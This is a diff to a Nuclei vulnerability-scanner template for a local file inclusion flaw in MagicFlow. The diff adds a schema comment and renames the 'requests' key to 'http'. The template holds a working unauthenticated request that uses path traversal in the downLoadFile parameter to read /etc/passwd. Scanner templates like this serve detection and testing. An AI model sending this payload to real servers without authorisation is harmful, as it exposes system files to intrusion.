@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: magicflow-lfi
 info:
   name: MagicFlow - Local File Inclusion
@@ -6,7 +7,7 @@ info:
   description: A vulnerability in MagicFlow allows remote unauthenticated users to access locally stored files on the server and return their content via the '/msa/main.xp' endpoint and the 'Fun' parameter.
   reference: https://www.seebug.org/vuldb/ssvid-89258
   tags: magicflow,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd"
